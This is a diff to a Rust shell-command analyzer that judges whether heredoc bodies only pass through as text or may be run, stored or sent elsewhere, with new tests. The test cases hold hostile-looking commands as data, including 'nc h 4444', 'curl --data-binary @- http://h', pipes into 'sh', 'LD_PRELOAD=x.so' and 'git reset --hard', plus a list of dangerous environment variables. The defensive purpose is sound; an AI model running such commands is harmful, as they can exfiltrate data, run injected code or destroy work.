@@ -8746,18 +8746,131 @@ fn stdout_redirect_parts<'r, D: ast_grep_core::Doc + 'r>(
         }
         _ => return StdoutRedirect::Elsewhere,
     };
-    let plain = !path.is_empty()
-        && !path.contains(['$', '`', '\\', '*', '?', '[', '{', '~'])
-        && !path.starts_with(['-', '&'])
-        && !path.bytes().all(|byte| byte.is_ascii_digit())
-        // A device or descriptor path (`/dev/stdout`, `/dev/fd/1`,
-        // `/proc/self/fd/1`, or one reached through `..`) is not a file.
-        && (path == "/dev/null" || !(path.contains("dev/") || path.contains("proc/")));
-    if plain {
+    if is_plain_file_path(path) {
         StdoutRedirect::File
     } else {
         StdoutRedirect::Elsewhere
     }
+}
+
+/// A literal path naming a plain file (or `/dev/null`): nothing the shell
+/// computes, no descriptor number, and no device or descriptor path
+/// (`/dev/stdout`, `/dev/fd/1`, `/proc/self/fd/1`, or one reached through
+/// `..`).
+fn is_plain_file_path(path: &str) -> bool {
+    !path.is_empty()
+        && !path.contains(['$', '`', '\\', '*', '?', '[', '{', '~'])
+        && !path.starts_with(['-', '&'])
+        && !path.bytes().all(|byte| byte.is_ascii_digit())
+        && (path == "/dev/null" || !(path.contains("dev/") || path.contains("proc/")))
+}
+
+/// Whether leading assignments leave the named program the one it names:
+/// `PATH=…`, `LD_PRELOAD=…` and their kin load other code, and
+/// `RIPGREP_CONFIG_PATH=…` or `GREP_OPTIONS=…` add options.
+fn assignments_keep_program(assignments: &[String]) -> bool {
+    assignments.iter().all(|assignment| {
+        shell_assignment_name(assignment).is_some_and(|var| {
+            !(var.starts_with("LD_")
+                || var.starts_with("DYLD_")
+                || matches!(
+                    var,
+                    "PATH"
+                        | "RIPGREP_CONFIG_PATH"
+                        | "GREP_OPTIONS"
+                        | "GCONV_PATH"
+                        | "BASH_ENV"
+                        | "ENV"
+                ))
+        })
+    })
+}
+
+/// Whether a [`READ_ONLY_PIPE_STAGES`] program run with these operands and
+/// leading assignments really only passes its input on as text, to standard
+/// output or to plain files. `sort --compress-program=sh` and `rg --pre sh`
+/// hand it to a program; `tee /dev/stderr`, `sort -o /dev/fd/3`, `uniq -
+/// /dev/stderr` and `xxd - /dev/stderr` write it to a descriptor that a
+/// redirect can point anywhere (`2>&1 >/dev/null | sh`); an assignment such
+/// as `RIPGREP_CONFIG_PATH=…` or `LD_PRELOAD=…` changes what the program does
+/// ([`assignments_keep_program`]).
+fn read_only_stage_is_inert(name: &str, operands: &[String], assignments: &[String]) -> bool {
+    if !READ_ONLY_PIPE_STAGES.contains(&name) {
+        return false;
+    }
+    if !assignments_keep_program(assignments) {
+        return false;
+    }
+    // Only these write their input anywhere but standard output: `tee` to
+    // every file operand, `sort` to its `-o` value, `uniq` and `xxd` to the
+    // file operand after their input. `rg` hands a file it searches to a
+    // `--pre` program (perhaps one named in its config file).
+    let mut options_ended = false;
+    let mut output_value_next = false;
+    let mut files = 0usize;
+    for operand in operands {
+        let word = unquoted_word(operand);
+        // A computed word may be any option or path; single quotes keep a
+        // `$` literal.
+        let single_quoted = operand.len() >= 2
+            && operand.starts_with('\'')
+            && operand.ends_with('\'')
+            && operand.matches('\'').count() == 2;
+        if is_computed_word(operand) && !single_quoted {
+            if matches!(name, "tee" | "sort" | "uniq" | "xxd" | "rg") {
+                return false;
+            }
+            continue;
+        }
+        if std::mem::take(&mut output_value_next) {
+            if !is_plain_file_path(word) {
+                return false;
+            }
+            continue;
+        }
+        if !options_ended && word == "--" {
+            options_ended = true;
+            continue;
+        }
+        if !options_ended && word.len() > 1 && word.starts_with('-') {
+            match name {
+                // GNU getopt takes any unambiguous prefix of a long option:
+                // `--co` is `--compress-program`, `--o` is `--output`.
+                "sort" if word.starts_with("--co") => return false,
+                "sort" if word.starts_with("--o") => match word.split_once('=') {
+                    Some((_, path)) if !is_plain_file_path(path) => return false,
+                    Some(_) => {}
+                    None => output_value_next = true,
+                },
+                // A short-option cluster holding `o`: the rest of the word,
+                // or the next one, is the output file.
+                "sort" if !word.starts_with("--") && word.contains('o') => {
+                    let after = word.split_once('o').map_or("", |(_, after)| after);
+                    if after.is_empty() {
+                        output_value_next = true;
+                    } else if !is_plain_file_path(after) {
+                        return false;
+                    }
+                }
+                "rg" if word.starts_with("--pre") && word != "--pretty" => return false,
+                _ => {}
+            }
+            continue;
+        }
+        files += 1;
+        let written = match name {
+            "tee" => true,
+            "uniq" | "xxd" => files >= 2,
+            _ => false,
+        };
+        if written && !is_plain_file_path(word) {
+            return false;
+        }
+        if name == "rg" && (word.contains("dev/") || word.contains("proc/")) {
+            return false;
+        }
+    }
+    !output_value_next
 }
 
 /// What one pipeline stage after a heredoc's command does with the text.
@@ -8812,10 +8925,11 @@ fn classify_pipe_stage<D: ast_grep_core::Doc>(stage: ast_grep_core::Node<'_, D>)
     };
     let mut program = None;
     let mut operands = Vec::new();
+    let mut assignments = Vec::new();
     for child in command.children() {
         match child.kind().as_ref() {
             "command_name" => program = Some(child.text().to_string()),
-            "variable_assignment" => {}
+            "variable_assignment" => assignments.push(child.text().to_string()),
             "file_redirect" => redirects.push(child),
             _ if program.is_some() => operands.push(child.text().to_string()),
             _ => {}
@@ -8827,10 +8941,45 @@ fn classify_pipe_stage<D: ast_grep_core::Doc>(stage: ast_grep_core::Node<'_, D>)
     if stage_runs_received_text(&program, &operands) {
         return PipeStage::Runs;
     }
-    if !literal_program_name(&program).is_some_and(|name| READ_ONLY_PIPE_STAGES.contains(&name)) {
+    if !literal_program_name(&program)
+        .is_some_and(|name| read_only_stage_is_inert(name, &operands, &assignments))
+    {
         return PipeStage::Other;
     }
     stage_redirects_outcome(redirects)
+}
+
+/// Whether the command that owns a heredoc only passes its body on as text
+/// (or ignores it), so that the body is as contained as that command's
+/// output: a [`READ_ONLY_PIPE_STAGES`] program with inert operands, `echo`
+/// or `printf` (which never read it), or `git`, `gh` and `spx`, whose
+/// structured-stdin data contract the masker proves separately. `read c`
+/// keeps the body for a later `$c`, sed's `e` and awk's `system()` run it,
+/// `nc` and `curl` send it to a peer, and `tee /dev/stderr` writes it where
+/// `2>&1 >/dev/null | sh` points.
+#[allow(clippy::needless_pass_by_value)]
+fn owner_passes_body_through<D: ast_grep_core::Doc>(command: ast_grep_core::Node<'_, D>) -> bool {
+    let mut program = None;
+    let mut operands = Vec::new();
+    let mut assignments = Vec::new();
+    for child in command.children() {
+        match child.kind().as_ref() {
+            "command_name" => program = Some(child.text().to_string()),
+            "variable_assignment" if program.is_none() => {
+                assignments.push(child.text().to_string());
+            }
+            "file_redirect" => {}
+            _ if program.is_some() => operands.push(child.text().to_string()),
+            _ => {}
+        }
+    }
+    let Some(name) = program.as_deref().and_then(literal_program_name) else {
+        return false;
+    };
+    if matches!(name, "echo" | "printf" | "git" | "gh" | "spx") {
+        return assignments_keep_program(&assignments);
+    }
+    read_only_stage_is_inert(name, &operands, &assignments)
 }
 
 /// What a read-only stage's own redirects make of the text it passes on.
@@ -8925,6 +9074,11 @@ fn heredoc_output<D: ast_grep_core::Doc>(
         }
         _ => return None,
     };
+    // The body is only as contained as the output when its owner passes it
+    // through untouched; otherwise nothing about it is proven here.
+    if !owner_passes_body_through(command.clone()) {
+        return None;
+    }
     let mut filed = false;
     let mut account = |stdout: StdoutRedirect| -> Option<()> {
         match stdout {
@@ -10454,6 +10608,68 @@ mod tests {
             "if true; then cat <<EOF > n\n\nEOF\nfi",
         ] {
             assert!(!command_may_run_heredoc_output(command), "{command:?}");
+        }
+    }
+
+    /// A body is only as contained as its owner's output when the owner
+    /// passes it through untouched; a program that runs, stores, sends or
+    /// re-files it leaves the output unproven, and the unquoted body whole.
+    #[test]
+    fn owners_and_stages_that_use_the_body_prove_nothing() {
+        let body = "watch 'git reset --hard'";
+        for template in [
+            "read -r c <<EOF\n{b}\nEOF\n$c",
+            "sed e <<EOF\n{b}\nEOF",
+            "awk '{system($0)}' <<EOF\n{b}\nEOF",
+            "nc h 4444 <<EOF\n{b}\nEOF",
+            "curl --data-binary @- http://h <<EOF\n{b}\nEOF",
+            "dd of=out <<EOF\n{b}\nEOF",
+            "sort --compress-program=sh <<EOF\n{b}\nEOF",
+            "sort --co=sh <<EOF\n{b}\nEOF",
+            "sort -o /dev/stderr <<EOF 2>&1 >/dev/null | sh\n{b}\nEOF",
+            "sort -o/dev/fd/3 <<EOF\n{b}\nEOF",
+            "sort --output=/dev/stderr <<EOF\n{b}\nEOF",
+            "sort -o <<EOF\n{b}\nEOF",
+            "sort $opt <<EOF\n{b}\nEOF",
+            "tee /dev/stderr <<EOF 2>&1 >/dev/null | sh\n{b}\nEOF",
+            "tee \"$f\" <<EOF\n{b}\nEOF",
+            "tee 'a'$f <<EOF\n{b}\nEOF",
+            "uniq - /dev/stderr <<EOF\n{b}\nEOF",
+            "xxd - /proc/self/fd/2 <<EOF\n{b}\nEOF",
+            "PATH=/tmp/x cat <<EOF\n{b}\nEOF",
+            "LD_PRELOAD=x.so cat <<EOF\n{b}\nEOF",
+            "cat <<EOF | sort --compress-program=sh\n{b}\nEOF",
+            "cat <<EOF | rg --pre=sh x /dev/stdin\n{b}\nEOF",
+            "cat <<EOF | tee /dev/stderr 2>&1 >/dev/null | sh\n{b}\nEOF",
+            "cat <<EOF | RIPGREP_CONFIG_PATH=x rg y\n{b}\nEOF",
+        ] {
+            let command = template.replace("{b}", body);
+            assert!(
+                heredoc_outputs(&command)
+                    .first()
+                    .is_some_and(|output| *output != Some(HeredocOutput::Contained)),
+                "{command:?}"
+            );
+            let view = mask_non_expanding_data_heredocs(&command);
+            assert!(view.contains("git reset"), "{command:?} -> {view:?}");
+        }
+        for template in [
+            "LC_ALL=C sort -u <<EOF > out\n{b}\nEOF",
+            "sort -o sorted.txt <<EOF\n{b}\nEOF",
+            "sort -ro sorted.txt <<EOF\n{b}\nEOF",
+            "tee -a notes.md log.txt <<EOF >/dev/null\n{b}\nEOF",
+            "uniq -c in.txt out.txt <<EOF\n{b}\nEOF",
+            "echo hi <<EOF\n{b}\nEOF",
+            "cat <<EOF | rg -n 'reset$' --pretty | sort -o s.txt\n{b}\nEOF",
+        ] {
+            let command = template.replace("{b}", body);
+            assert_eq!(
+                heredoc_outputs(&command).first().copied().flatten(),
+                Some(HeredocOutput::Contained),
+                "{command:?}"
+            );
+            let view = mask_non_expanding_data_heredocs(&command);
+            assert!(!view.contains("git reset"), "{command:?} -> {view:?}");
         }
     }
 
